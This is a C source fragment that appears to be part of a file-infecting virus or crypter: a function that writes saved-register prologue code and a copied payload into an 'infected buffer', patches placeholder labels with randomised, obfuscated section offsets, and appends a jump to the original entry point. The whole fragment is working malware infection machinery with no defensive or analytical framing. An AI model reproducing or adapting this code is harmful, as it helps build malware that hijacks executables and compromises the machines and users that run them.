

// GetLen or Write C_CODE into dest
#define MAX_REPL 50

#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif


// Write new EP in the infected buffer
DWORD WriteOrGetLen_C_CODE(unsigned char *dest, DWORD *repl_data, DWORD exe_LibMain_vadr, DWORD epRVA)
{
	DWORD repl_cnt[MAX_REPL]; // replace counter
	DWORD repl_1st[MAX_REPL]; // pervoe slagaemoe

	// Code 
	unsigned char *b = (unsigned char*)&C_CODE_NG;

	DWORD lins=9; // len of inserted code 
	DWORD e; // for b 
	DWORD i; // for dest

	DWORD ip1, ip2, abcd;

#ifdef CCRW_BIN
	if (C_CODE_BIN != NULL) 
		b = C_CODE_BIN; //loaded from ccrw.bin
#endif                       

	// Register save in dest
	if (dest != NULL) 
	{ 
		for (e = 0; e < MAX_REPL; e++) 
			repl_cnt[e] = 0; 
		//  dest[0]=0x90;  // nop
		//  dest[1]=0x60;  // pushad

		// pushad = push eax, ecx, edx, ebx, esp, ebp, esi, edi
		dest[0] = 0x50; //   push        eax
		dest[1] = 0x51; //   push        ecx
		dest[2] = 0x90; //   nop
		dest[3] = 0x52; //   push        edx
		dest[4] = 0x53; //   push        ebx
		dest[5] = 0x54; //   push        esp
		dest[6] = 0x55; //   push        ebp
		dest[7] = 0x56; //   push        esi
		dest[8] = 0x57; //   push        edi
	}  

	for (e = 0;; e++)
	{
		DWORD dwb;

		// We should write after inserted code
		i = e+lins;

		dwb=((DWORD*)&b[e])[0];

		// Copy code
		if (dest != NULL) 
		{
			// Label to replace
			BOOL LABEL = FALSE;
			DWORD q, dwx;

			// Check if we need to replace data
			for (q = 0xF0; q < 0xFF; q++)
			{
		 		dwx = q + q*0x100 + q*0x10000 + q*0x1000000;

		 		// when see 5-bytes instead of 4: XX.XX.XX.XX.XX, use last 4 bytes
		 		// because it can be opcode like 
		 		// 817DFC FCFCFCFC   cmp d,[ebp][-04],0FCFCFCFC 
		 		// opcodes started with F0-FE are not possible in our code => we use last 4
		 		if ((dwx==dwb)&&(b[e+4]!=q)) 
					LABEL=TRUE;  
			}                                    

			// Replace data if needed
			if (LABEL==TRUE) 
			{
				DWORD n=0xFE-b[e+1];

				// For text and data section offset we use some trick to obfuscate this
				if ((n==0)||(n==13))
				{
			 		if (repl_cnt[n]==0) 
					{ 
						repl_1st[n]=_rand()%repl_data[n]; 
						((DWORD*)&dest[i])[0]=repl_1st[n]; 
					}; 
			 		if (repl_cnt[n]==1) 
					{ 
						((DWORD*)&dest[i])[0]=repl_data[n]-repl_1st[n]; 
					};

			 		e+=3;
			 		repl_cnt[n]++;
			 		continue;
				}

				// Replace the data
				((DWORD*)&dest[i])[0]=repl_data[n];
				e+=3;
				continue; 
			} 

			// Write the byte in infected buffer
			dest[i]=b[e]; 
		}

		// 0xC9==leave 0xC3==ret
		if ((b[e]==0x5D)&&(b[e+1]==0xC3))
		{
			e++;
			i++; 
			break; 
		}
	}


	e += 5;    // +5 bytes jmp
	e += lins; // +lins bytes inserted code
	if (dest == NULL)
		return e; // GetLen mode


	// Write mode only: set jump to LibMain
	dest[i]=0xE9; // jmp opcode
	
	ip1 = repl_data[8]+epRVA+i; // eip of jmp xxxxxxxx
	ip2 = exe_LibMain_vadr;

	 // abcd=ffffffff-ip1+ip2-4
	 // we use fffffffe and -3 instead: with 0xFFFFFFFF lcc makes stack bug
	abcd = (0xFFFFFFFE - ip1) + ip2 - 3;    
	                                                   
	((DWORD*)(&dest[i+1]))[0] = abcd;
	i += 4;

	return e;
}


#ifdef _MSC_VER
	#pragma optimize("", on)
#else
	#pragma optimize(on)
#endif
